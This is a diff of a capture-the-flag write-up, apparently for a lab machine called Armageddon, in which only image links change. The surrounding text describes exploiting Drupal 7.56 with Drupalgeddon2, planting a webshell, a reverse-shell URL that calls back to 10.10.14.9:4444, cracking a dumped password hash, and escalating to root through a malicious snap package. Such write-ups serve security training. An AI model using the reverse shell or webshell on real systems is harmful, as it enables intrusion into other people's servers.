@@ -4,17 +4,17 @@
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(2030).png>)
+![](../../../.gitbook/assets/armageddon-5.png)
 
 Doing a detailed scan reveals that port 80 is running Drupal 7.
 
-![](<../../../.gitbook/assets/image%20(1095).png>)
+![](../../../.gitbook/assets/armageddon-1.png)
 
 ### Drupalgeddon
 
 Because this was running Drupal, we can directly head to the CHANGELOG.txt directory to view the version used.
 
-![](<../../../.gitbook/assets/image%20(3277).png>)
+![](../../../.gitbook/assets/armageddon-9.png)
 
 Drupal 7.56 is vulnerable to the Drupalgeddon2 RCE exploit.
 
@@ -22,11 +22,11 @@ Drupal 7.56 is vulnerable to the Drupalgeddon2 RCE exploit.
 
 We can use this to easily put a webshell on the page. The exploit would put a `shell.php` file on the webserver that takes a `c` parameter for the RCE.
 
-![](<../../../.gitbook/assets/image%20(2635).png>)
+![](../../../.gitbook/assets/armageddon-6.png)
 
 By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444+0>&1`, we would get a shell.
 
-![](<../../../.gitbook/assets/image%20(1695).png>)
+![](../../../.gitbook/assets/armageddon-3.png)
 
 ## Privilege Escalation
 
@@ -34,15 +34,15 @@ By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444
 
 Within the Drupal configuration files at `/sites/default/settings`, we can find a password for the SQL database.
 
-![](<../../../.gitbook/assets/image%20(2982).png>)
+![](../../../.gitbook/assets/armageddon-7.png)
 
 With this, we can login to the SQL server and enumerate the database. By dumping the users table from the drupal database, we can find a username and hash.
 
-![](<../../../.gitbook/assets/image%20(642).png>)
+![](../../../.gitbook/assets/armageddon-11.png)
 
 Hash is easily cracked with `john`.
 
-![](<../../../.gitbook/assets/image%20(4076).png>)
+![](../../../.gitbook/assets/armageddon-10.png)
 
 Then we can SSH in as the `brucetherealadmin` user using this credential.
 
@@ -50,11 +50,11 @@ Then we can SSH in as the `brucetherealadmin` user using this credential.
 
 When checking sudo privilges of this machine, we see that we can run `snap`.
 
-![](<../../../.gitbook/assets/image%20(1896).png>)
+![](../../../.gitbook/assets/armageddon-4.png)
 
 By checking the snap version, we can see that this is not vulnerable to the dirty sock exploit because it is updated.
 
-![](<../../../.gitbook/assets/image%20(1477).png>)
+![](../../../.gitbook/assets/armageddon-2.png)
 
 However, because we run `snap` as root, this means that we can create a malicious snap package to be downloaded, and the imported package would run the dirty\_sock exploit.
 
@@ -74,4 +74,4 @@ su dirty_sock
 
 This would spawn a root shell:
 
-![](<../../../.gitbook/assets/image%20(3058).png>)
+![](../../../.gitbook/assets/armageddon-8.png)
